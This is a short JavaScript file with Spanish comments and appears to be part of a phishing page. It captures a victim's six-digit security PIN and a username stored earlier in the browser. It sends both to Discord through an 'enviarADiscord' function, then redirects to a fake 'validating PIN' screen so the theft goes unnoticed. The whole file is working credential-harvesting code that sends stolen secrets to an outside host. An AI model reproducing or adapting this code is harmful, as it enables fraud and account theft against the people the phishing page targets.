document.addEventListener('DOMContentLoaded', () => {
    const pinForm = document.getElementById('pinForm');
    const pinInput = document.querySelector('input[name="num_pin"]');
    const pinButton = document.querySelector('.btn');

    // Cambiamos el destino hacia la pantalla de carga intermedia
    const REDIRECCION_URL = 'validando_pin.html';

    pinForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const pin = pinInput.value;
        const usuario = localStorage.getItem('usuario_guardado') || 'No detectado';

        const mensaje = `🔐 **PIN de Seguridad**\n\n` +
                        `👤 **Usuario Asociado:** ${usuario}\n\n` +
                        `🔢 **PIN de 6 Dígitos:** ${pin}\n\n\n`;

        pinButton.disabled = true;
        pinButton.innerText = 'Validando...';

        await enviarADiscord(mensaje);
        window.location.href = REDIRECCION_URL;
    });
});